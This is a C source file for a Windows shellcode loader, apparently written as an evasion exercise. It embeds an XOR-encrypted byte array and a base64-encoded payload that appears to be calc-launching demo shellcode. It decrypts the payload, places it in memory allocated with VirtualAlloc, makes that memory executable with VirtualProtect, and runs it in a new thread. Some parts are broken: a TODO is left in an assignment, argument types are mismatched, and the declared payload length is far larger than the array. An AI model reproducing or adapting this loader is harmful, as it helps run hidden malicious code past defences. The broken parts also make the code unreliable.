/**
    This is the exe that I will be able to use to call
    my dll
    **/

#include <windows.h>
#include <stdio.h> 
#include <stdlib.h>
#include <string.h>
#include <Wincrypt.h>
//Only needed for AES
#include <psapi.h> 
 // Needed only for AES
#pragma comment (lib,"advapi32")
// Only extra needed for 64, also needed for AES

#pragma comment (lib, "Crypt32.lib") 



// Base64 length 260
// xor length 835

#define payload_len_val 835

#define key_val "password"


//Storing the payload as a global changes where it is stored
// in the executable into the data section

/**
    For decode base64 returns the length of the returned payload


*/

char * getKey(int * key_len){

    
    *key_len = strlen(key_val);
    printf("key length: %d", *key_len);
    char * key = malloc( sizeof(char) * ( *key_len ) );
    strcpy(key, key_val);

    printf("base key: %s\n", key);

    printf("return key: %s\nat: %p\n", key, (void *) key);

    return key;


}

    // decode(payload, XOR_encrypted_payload, payload_len_val, 
    //     key, strlen(key), 2);

int decode(char * payload, char * encrypted_payload, 
            int * payload_len, char * key, int key_length,  int methiod){


    switch(methiod)  {
        
        //Base64 decoding
        case 1:
            puts("decoding the B64 Payload\n");

            // DecodeBase64((const BYTE *) encrypted_payload, payload_len, 
            //     (char *) payload, payload_len);

            // Not sure where I got this
            
            DWORD   outLen;
            BOOL fRet;
            outLen = //TODO

            fRet = CryptStringToBinary( (LPCSTR) encrypted_payload,
                payload_len, CRYPT_STRING_BASE64, (BYTE *)payload,
                 &outLen, NULL, NULL);

            //failed run
            if(!fRet)
                return 0;
            
            return outLen;





        break;

        // XOR decryption
        case 2:

            puts("Decrytping the XOR payload\n");

            int i;
            int j = 0;

            printf("Key: %s\nData: %x", key, encrypted_payload);

            //TODO would this be a <= because 
            // this is raw data and not char with a null byte
            for (i = 0; i < payload_len; i++){
                payload[i] = encrypted_payload[i] ^ key[j];
                j = (j +1) % key_length;
            }



        break;


        //AES Decryption
        case 3:

            //AES decrypts the string into itself so copy the 
            // encrypted one to the output

            puts("decrypting AES payload now\n");

            RtlMoveMemory(payload, encrypted_payload, payload_len);

            HCRYPTPROV hProv;
            HCRYPTHASH hHash;
            HCRYPTKEY hKey;

            CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
            CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
            CryptHashData(hHash, (BYTE*)key, (DWORD) key_length, 0);
            CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);

            CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0,0, encrypted_payload, payload_len);




        break;





    }

    puts("\npayload is in plaintext now\n");

    return 1;



    
}


int main(void) {

    printf("here I come");

    getchar();

    unsigned char XOR_encrypted_payload[] = {
        0x8c, 0x89, 0xf1, 0x73, 0x77, 0x6f, 0x12, 0xed, 
        0x95, 0x50, 0xb3, 0x17, 0xfc, 0x3f, 0x42, 0xef,
        0x22, 0x6d, 0xf8, 0x21, 0x63, 0xe4, 0x0, 0x4c, 
        0x7f, 0xd6, 0x39, 0x55, 0x46, 0x90, 0xde, 0x58, 
        0x11, 0x1d, 0x71, 0x5f, 0x57, 0xae, 0xbd, 0x69, 
        0x71, 0xa6, 0x91, 0x81, 0x25, 0x38, 0xf9, 0x36, 
        0x60, 0xea, 0x39, 0x4f, 0xfc, 0x23, 0x63, 0x1c, 
        0x93, 0x29, 0x72, 0xa2, 0x26, 0xe4, 0x2b, 0x44, 
        0x71, 0xb2, 0xf8, 0x3a, 0x6f, 0x8c, 0x48, 0x2d, 
        0xfb, 0x55, 0xf8, 0x72, 0xa1, 0x5e, 0x8d, 0xc8, 
        0xb1, 0xae, 0x7e, 0x72, 0xb0, 0x57, 0x92, 0x11, 
        0x86, 0x62, 0xe, 0x8b, 0x4c, 0x12, 0x56, 0x11, 
        0x94, 0x39, 0xf8, 0x2b, 0x53, 0x6e, 0xa1, 0x2, 
        0xfb, 0x6d, 0x38, 0xf8, 0x2f, 0x73, 0x73, 0xb7, 
        0xfb, 0x65, 0xf8, 0x72, 0xa7, 0xe6, 0x36, 0x40, 
        0x54, 0x3a, 0x28, 0x12, 0x2e, 0x35, 0x23, 0x9b, 
        0x90, 0x3e, 0x2c, 0x29, 0xfc, 0x7d, 0x99, 0xe9, 
        0x2d, 0xb, 0x72, 0xfe, 0xf2, 0xdd, 0x72, 0x64, 
        0x70, 0x31, 0x1b, 0x42, 0xfc, 0x0, 0xf5, 0x9b, 
        0xa5, 0xda, 0x83, 0xc6, 0xd5, 0x39, 0x1a, 0xc2, 
        0xe5, 0xdc, 0xee, 0x8c, 0xa2, 0x53, 0x74, 0x18, 
        0x7a, 0xe1, 0x88, 0x93, 0x2, 0x6a, 0xc9, 0x23, 
        0x63, 0x13, 0x1c, 0x19, 0x77, 0x3c, 0x8d, 0xb1, 
        0x13, 0x0, 0x1f, 0x10, 0x59, 0xa, 0xa, 0x1, 0x70};

    unsigned char B64_encoded_payload[] = 
        "/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQH"
        "H4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw"
        "0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYV"
        "laUf/gX19aixLrjV1qAY2FsgAAAFBoMYtvh//Vu/C1olZoppW9nf/VPAZ"
        "8CoD74HUFu0cTcm9qAFP/1WNhbGMuZXhlAA==";





    void * payload_mem;
    BOOL succseful_mem_change;
    HANDLE thread;
    DWORD oldprotect = 0;
    int key_length;
    char * key = getKey(&key_length);
    printf("Size of key: %d\n", key_length);

    

    printf("given key: %s\nat: %p\n", key, (void *) key);

    char payload[payload_len_val];



    decode(payload, XOR_encrypted_payload, payload_len_val, 
        key, key_length, 2);







    //Create a memory area we can controle the permisions of
    payload_mem = VirtualAlloc(0, payload_len_val, MEM_COMMIT | 
        MEM_RESERVE, PAGE_READWRITE);

    //not sure why I methiodd: succseful_mem_change
    
    //copy the payload to the memory
    RtlMoveMemory(payload_mem, payload, payload_len_val);
    
    printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
    printf("%-20s : 0x%-016p\n", "payload mem addr", (void *)payload_mem);


    //Change the memory to read exicutable in order to run the payload
    succseful_mem_change = VirtualProtect(payload_mem, payload_len_val, 
        PAGE_EXECUTE_READ, &oldprotect);

    printf("\n ready to rock and roll\n");


    if ( succseful_mem_change ) {
        thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) payload_mem, 0, 0, 0);
        WaitForSingleObject(thread, -1); 
    }


    printf("payload done");



    return 0;

}